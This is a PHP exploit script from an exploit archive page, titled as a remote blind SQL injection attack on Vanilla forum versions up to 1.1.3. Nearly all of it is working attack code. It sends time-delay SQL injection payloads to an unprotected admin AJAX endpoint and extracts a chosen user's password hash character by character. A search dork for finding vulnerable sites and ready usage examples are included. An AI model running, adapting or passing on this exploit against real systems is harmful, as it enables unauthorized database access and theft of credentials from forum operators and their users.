<html><head><title>Vanilla <= 1.1.3 Remote Blind SQL Injection Exploit</title></head><pre>&lt;?php
## Vanilla &lt;= 1.1.3 Remote Blind SQL Injection Exploit
## By InATeam (http://inattack.ru/)
## Requirements: MySQL &gt;= 4.1, magic_quotes_gpc=Off
## Tested on versions 1.1.3, 1.1.2, 1.0.1

echo &quot;------------------------------------------------------------\n&quot;;
echo &quot;Vanilla &lt;= 1.1.3 Remote Blind SQL Injection Exploit\n&quot;;
echo &quot;(c)oded by Raz0r, InATeam (http://inattack.ru/)\n&quot;;
echo &quot;dork: \&quot;is a product of Lussumo\&quot;\n&quot;;
echo &quot;------------------------------------------------------------\n&quot;;

if ($argc&lt;2) {
echo &quot;USAGE:\n&quot;;
echo &quot;~~~~~~\n&quot;;
echo &quot;php {$argv[0]} [url] OPTIONS\n\n&quot;;
echo &quot;[url]        - target server where Vanilla is installed\n\n&quot;;
echo &quot;OPTIONS:\n&quot;;
echo &quot;-p=&lt;prefix&gt;  - use specific prefix (default LUM_)\n&quot;;
echo &quot;-id=&lt;id&gt;     - use specific user id (default 1)\n&quot;;
echo &quot;-c=&lt;count&gt;   - benchmark()'s loop count (default 300000)\n&quot;;
echo &quot;-v           - verbose mode\n\n&quot;;
echo &quot;tip:\n&quot;;
echo &quot;use bigger number of &lt;count&gt; if server is slow\n\n&quot;;
echo &quot;examples:\n&quot;;
echo &quot;php {$argv[0]} http://site.com/vanilla/ -p=forum_ -id=2\n&quot;;
echo &quot;php {$argv[0]} http://forum.site.com:8080/ -c=400000\n&quot;;
die;
}
/**
* Software site: http://lussumo.com/
*
* Script /ajax/sortcategories.php is supposed to be used by admin to sort
* the categories. However it isnt protected from unathorized users. Besides,
* it doesnt properly sanitize user's input data, so we can inject the SQL * code into the UPDATE query. Script /ajax/sortroles.php is also vulnerable.
*/
error_reporting(0);
set_time_limit(0);
ini_set(&quot;max_execution_time&quot;,0);
ini_set(&quot;default_socket_timeout&quot;,20);
$url = $argv[1];
for($i=2;$i&lt;$argc;$i++) {
   if(strpos($argv[$i],&quot;=&quot;)!==false) {
       $exploded=explode(&quot;=&quot;,$argv[$i]);
       if ($exploded[0]=='-p') $prefix = $exploded[1];
       if ($exploded[0]=='-id') $id = $exploded[1];
       if ($exploded[0]=='-c') $benchmark = $exploded[1];
   }
   elseif($argv[$i] == '-v') $verbose=true;
}
if (!isset($prefix)) $prefix = &quot;LUM_&quot;;
if (!isset($id)) $id = 1;
if (!isset($benchmark)) $benchmark = 300000;
if (!isset($verbose)) $verbose=false;

$url_parts = parse_url($url);
$host = $url_parts['host'];
if (isset($url_parts['port'])) $port = $url_parts['port']; else $port = 80;
$path = $url_parts['path'];
$query_pattern = &quot;-99'+OR+IF(%s,BENCHMARK(%d,MD5(31337)),1)/*&quot;;
print &quot;[~] Testing probe delays...\n&quot;;
$ok=true; $nodelay=0; $withdelay=0;
for ($i=1;$i&lt;=3;$i++){
   $query = sprintf($query_pattern, &quot;1=1&quot;, 1);
   $fdelay = get($query);
   if ($fdelay!==false) $nodelay+=$fdelay; else {$ok=false;break;}
   $query = sprintf($query_pattern, &quot;1=1&quot;, $benchmark);
   $sdelay = get($query);
   if ($sdelay!==false) $withdelay+=$sdelay;  else {$ok=false;break;}
   if ($sdelay&lt;=($fdelay*2)) {$ok=false;break;}
   usleep($benchmark/1000); $delay=false;
}
if ($ok) {
   $nondelayed = $nodelay/3;
   print &quot;[+] Average nondelayed queries response time: &quot;.round($nondelayed,1).&quot; dsecs\n&quot;;
   $delayed = $withdelay/3;
   print &quot;[+] Average delayed queries response time: &quot;.round($delayed,1).&quot; dsecs\n&quot;;
}
else die(&quot;[-] Exploit failed\n&quot;);
print &quot;    Getting hash...&quot;;
if ($verbose) {print &quot;\r[~]&quot;; print &quot;\n&quot;;}
$hash='';
for($i=1; $i&lt;=32; $i++) {
   $chr = gethashchar($i);
   if($chr!==false) $hash .= $chr;
   else {
       $chr = gethashchar($i);
       if ($chr !==false)$hash .= $chr;
       else die(&quot;\n[-] Exploit failed\n&quot;);          }   }
if (!$verbose) {print &quot;\r[~]&quot;; print &quot;\n&quot;;}
print &quot;[+] Result: {$hash}\n&quot;;

function gethashchar ($pos) {
   global $query_pattern,$prefix,$id,$benchmark,$verbose;
   $inj = &quot;ORD(SUBSTRING((SELECT+Password+FROM+{$prefix}User+WHERE+UserID={$id}),{$pos},1))&quot;;
   $query = sprintf($query_pattern, $inj.&quot;&gt;57&quot;, $benchmark*4);
   $success = condition($query);
   if (!$success) {
       if ($verbose) print &quot;[v] Position {$pos}: char is [0-9]\n&quot;;
       $min = 48;
       $max = 57;          }
   else {
       if ($verbose) print &quot;[v] Position {$pos}: char is [a-f]\n&quot;;
       $min = 97;
       $max = 102;          }
   for($i=$min;$i&lt;=$max;$i++) {
       $query = sprintf($query_pattern, $inj.&quot;=&quot;.$i, $benchmark*4);
       $success = condition($query);
       if ($success) {
           $query = sprintf($query_pattern, $inj.&quot;&lt;&gt;&quot;.$i, $benchmark*4);
           $recheck = condition($query);
           if (!$recheck) {
               $chr = chr($i);
               if ($verbose) print &quot;[v] Position {$pos}: char is {$chr}\n&quot;;
               return $chr;
           }
       }
   }
   return false;
}
function condition($query) {
   global $delayed,$benchmark,$verbose;
   for($attempt = 1; $attempt &lt;= 10; $attempt++){
       $delay = get($query,true);
       if ($delay === false) {
           if ($verbose) print &quot;[v] Attempt {$attempt}: error\n&quot;;
       }
       else {
           if ($verbose) print &quot;[v] Attempt {$attempt}: success (delay is {$delay} dsecs)\n&quot;;                      break;
       }
   }
   if ($attempt == 10) die(&quot;[-] Exploit failed\n&quot;);
   if($delay &gt; ($delayed * 2)) {
       usleep(($benchmark*4)/1000);
       return true;      }
   return false;
}
function get($query,$gethash=false) {
   global $host,$port,$path,$verbose;
   if ($gethash&amp;&amp;!$verbose) status();
   $start = getmicrotime();
   $ock = fsockopen(gethostbyname($host),$port);
   if (!$ock) return false;
   else {
       $packet  = &quot;GET {$path}ajax/sortcategories.php?CategoryID={$query} HTTP/1.0\r\n&quot;;
       $packet .= &quot;Host: {$host}\r\n&quot;;
       $packet .= &quot;User-Agent: InAttack User Agent\r\n&quot;;
       $packet .= &quot;Connection: Close\r\n\r\n&quot;;
       fputs($ock, $packet);
       $html='';
       while (!feof($ock)) $html.=fgets($ock);
       $end = getmicrotime();
       $exploded = explode(&quot;\r\n&quot;,$html);
       $errno=array();
       preg_match('@(\d{3})@',$exploded[0],$errno);
       if ($errno[1]!=200) die(&quot;[-] Exploit failed\n&quot;);
   }
   return intval(($end-$start)*10);
}
function status() {
   static $n;
   $n++;
   if ($n &gt; 3) $n = 0;
   if($n==0){ print &quot;\r[-]\r&quot;; }
   if($n==1){ print &quot;\r[\\]\r&quot;;}
   if($n==2){ print &quot;\r[|]\r&quot;; }
   if($n==3){ print &quot;\r[/]\r&quot;; }
}
function getmicrotime() {return array_sum(explode(&quot; &quot;, microtime()));}
?&gt;

# milw0rm.com [2007-10-20]</pre></html>